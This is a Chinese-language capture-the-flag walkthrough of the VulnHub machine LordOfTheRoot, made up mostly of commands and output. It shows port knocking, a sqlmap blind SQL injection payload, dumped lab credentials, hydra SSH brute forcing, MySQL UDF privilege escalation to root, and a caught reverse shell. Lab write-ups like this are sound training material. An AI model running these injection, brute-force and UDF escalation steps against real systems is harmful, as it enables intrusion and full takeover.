---
title: LordOfTheRoot Walkthrough
date: 2025-10-24
categories: ['walkthrough','vulnhub']
tags: ['udf-pe','port_knocking']
description: sqli注入ssh爆破打点，udf提权
author: may
image:
  path: ./../assets/images/2025-10-22-LordOfTheRoot-Walkthrough/cover%20(12).png
---

# Recon

这台机器仅开放ssh

```SHELL
(py311) ┌──(kali㉿kali)-[~/vulnhub/lordoftheroot]
└─$ sudo /usr/lib/nmap/nmap  -sT -sV -A -p- -n -oN ports 192.168.2.138
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 02:45 EDT
Nmap scan report for 192.168.2.138
Host is up (0.00056s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
MAC Address: 00:0C:29:47:2A:DE (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.13 - 4.4 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.14 (93%), Linux 3.8 - 3.16 (93%), Linux 4.4 (92%), Linux 3.13 (90%), Linux 4.2 (89%), Linux 3.13 - 3.16 (87%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.2.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.79 seconds

```

## Port knocking

只开放了ssh，那么尝试连接，在返回的banner中提示需要`PortKnocking`，序列应该是`1 2 3`

```shell
py311) ┌──(kali㉿kali)-[~/vulnhub/lordoftheroot]
└─$ ssh root@192.168.2.138                                            
The authenticity of host '192.168.2.138 (192.168.2.138)' can't be established.
ED25519 key fingerprint is SHA256:Rz24fg01xp2jMdwk9c44ijnZAz1uaUlvRXX7QU+ERtI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.138' (ED25519) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
root@192.168.2.138's password: 
```

使用`1 2 3`序列knock后重新nmap扫描，新增了`1337`端口，是一个web

```shell
(py311) ┌──(kali㉿kali)-[~/vulnhub/lordoftheroot]
└─$ sudo knock 192.168.2.138 1 2 3                           
(py311) ┌──(kali㉿kali)-[~/vulnhub/lordoftheroot]
└─$ sudo nmap --min-rate 10000 -sT -sV -A -p- -n 192.168.2.138 -oN ports
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 03:16 EDT
Nmap scan report for 192.168.2.138
Host is up (0.00045s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:47:2A:DE (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.2 - 4.14 (93%), Linux 3.13 - 4.4 (92%), Linux 3.16 - 4.6 (92%), Linux 3.8 - 3.16 (92%), Linux 4.4 (92%), Linux 3.13 (90%), Linux 4.2 (89%), Linux 3.18 (88%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.2.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.68 seconds
```

## http

访问首页是一张图片

![image-20251023153331546](./../assets/images/2025-10-22-LordOfTheRoot-Walkthrough/image-20251023153331546.png)

访问`/index`是另一张图片，源代码有base64注释

```html
<html>
<img src="/images/hipster.jpg" align="middle">
<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
</html>
```

base64解码，得到`/978345210/index.php  `

```shell
(py311) ┌──(kali㉿kali)-[~/vulnhub/lordoftheroot]
└─$ echo THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh|base64 -d
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!                                                                                                                                                            
(py311) ┌──(kali㉿kali)-[~/vulnhub/lordoftheroot]
└─$ echo Lzk3ODM0NTIxMC9pbmRleC5waHA=|base64 -d                    
/978345210/index.php   
```

访问后是一个登录界面

![image-20251023154344077](./../assets/images/2025-10-22-LordOfTheRoot-Walkthrough/image-20251023154344077.png)

给sqlmap跑一遍，存在盲注

```shell
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=yyGx' AND (SELECT 3611 FROM (SELECT(SLEEP(5)))jHMw) AND 'VbnU'='VbnU&password=Dokl&submit= Login
---
```

在Webapp.Users表中得到一些凭证

```shell
Database: Webapp
Table: Users
[5 entries]
+----+------------------+----------+
| id | password         | username |
+----+------------------+----------+
| 1  | iwilltakethering | frodo    |
| 2  | MyPreciousR00t   | smeagol  |
| 3  | AndMySword       | aragorn  |
| 4  | AndMyBow         | legolas  |
| 5  | AndMyAxe         | gimli    |
+----+------------------+----------+
```

# shell as smeagol by ssh

web应用登录不成功，尝试ssh爆破，得到`smeagol:MyPreciousR00t`

```shell
(py311) ┌──(kali㉿kali)-[~/vulnhub/lordoftheroot]
└─$ hydra -L users.txt -P passwd.txt 192.168.2.138 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-23 05:20:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:7/p:7), ~4 tries per task
[DATA] attacking ssh://192.168.2.138:22/
[22][ssh] host: 192.168.2.138   login: smeagol   password: MyPreciousR00t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-23 05:20:34
```

登录成功

```shell
smeagol@LordOfTheRoot:~$ id
uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
```

# shell as root by mysql-udf privileges esclate

查看运行的服务有mysql，通过ps -ef并过滤发现mysqld以root权限运行，那么可以考虑udf提权

```shell
smeagol@LordOfTheRoot:/var/www/978345210$ netstat -nltpa
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.2.138:22        192.168.2.100:51098     ESTABLISHED -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
tcp6       0      0 :::1337                 :::*                    LISTEN      -               
tcp6       1      0 ::1:40050               ::1:631                 CLOSE_WAIT  -               
smeagol@LordOfTheRoot:/var/www/978345210$ ps -ef|grep mysql
root      1142     1  0 Oct23 ?        00:01:38 /usr/sbin/mysqld
smeagol   7680  5272  0 00:24 pts/4    00:00:00 grep --color=auto mysql
```

检查mysql运行的机器服务架构，为32为系统

```shell
mysql> select @@version_compile_os;
+----------------------+                                                    
| @@version_compile_os |                                                    
+----------------------+                                                    
| debian-linux-gnu     |                                                    
+----------------------+                                                    
1 row in set (0.00 sec)                                                     
                                                                            
mysql> select @@version_compile_machine;                                  
+---------------------------+                                               
| @@version_compile_machine |                                               
+---------------------------+                                               
| i686                      |                                               
+---------------------------+                                               
1 row in set (0.00 sec)      
```

使用`/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so`

```shell
mysql> select @@plugin_dir;
+------------------------+
| @@plugin_dir           |
+------------------------+
| /usr/lib/mysql/plugin/ |
+------------------------+
1 row in set (0.00 sec)

mysql> select load_file('/tmp/udf.so') into dumpfile "/usr/lib/mysql/plugin/udf.so";
Query OK, 1 row affected (0.00 sec)                                                         
mysql> create function sys_exec returns int soname 'udf.so';
Query OK, 0 rows affected (0.01 sec)                                                
mysql> create function sys_eval returns string soname 'udf.so';
Query OK, 0 rows affected (0.00 sec)                                              
mysql> select * from mysql.func;                
+----------+-----+--------+----------+          
| name     | ret | dl     | type     |          
+----------+-----+--------+----------+          
| sys_exec |   2 | udf.so | function |          
| sys_eval |   0 | udf.so | function |          
+----------+-----+--------+----------+          
2 rows in set (0.00 sec)                                                             
mysql> select sys_eval('id');
+----------------------------------------+                                                                                                                  
| sys_eval('id')                         |                                                                                                                  
+----------------------------------------+                                                                                                                  
| uid=0(root) gid=0(root) groups=0(root) |                                                                                                                  
+----------------------------------------+                                                                                                                  
1 row in set (0.06 sec)   
```

低权限写入反弹shell脚本，然后通过sys_eval执行脚本反弹shell

```shell
(py311) ┌──(kali㉿kali)-[~]
└─$ pwncat-cs -lp 443
[04:04:16] Welcome to pwncat 🐈! __main__.py:164
[04:04:18] received connection from 192.168.2.138:59082 bind.py:84
[04:04:19] 192.168.2.138:59082: registered new host w/ db manager.py:957                               
(remote) root@LordOfTheRoot:/var/lib/mysql# id
uid=0(root) gid=0(root) groups=0(root)
(remote) root@LordOfTheRoot:/var/lib/mysql# 
```

